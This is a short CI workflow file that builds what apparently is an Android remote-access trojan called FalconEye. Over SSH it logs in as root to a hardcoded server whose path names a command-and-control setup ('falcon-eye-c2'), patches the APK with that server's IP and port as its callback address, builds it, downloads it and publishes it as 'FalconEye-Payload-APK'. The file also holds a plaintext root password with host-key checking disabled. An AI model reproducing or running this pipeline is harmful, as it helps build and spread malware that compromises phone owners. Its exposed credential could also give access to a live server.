name: Build FalconEye APK

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install sshpass
        run: sudo apt-get update && sudo apt-get install -y sshpass

      - name: Trigger Remote Build on VPS
        run: |
          sshpass -p 'n036mKelPVXd' ssh -o StrictHostKeyChecking=no root@77.105.133.37 "cd /opt/falcon-eye-c2/server && node -e \"const apkBuilder = require('./includes/apkBuilder'); apkBuilder.patchAPK('77.105.133.37', '22222', (err) => { if(err) console.error(err); else apkBuilder.buildAPK((err) => { if(err) console.error(err); else console.log('BUILD_DONE'); }) });\""

      - name: Download APK from VPS
        run: |
          mkdir -p app/build/outputs/apk/debug/
          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no root@77.105.133.37:/opt/falcon-eye-c2/server/assets/webpublic/build.s.apk app/build/outputs/apk/debug/FalconEye.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: FalconEye-Payload-APK
          path: app/build/outputs/apk/debug/*.apk
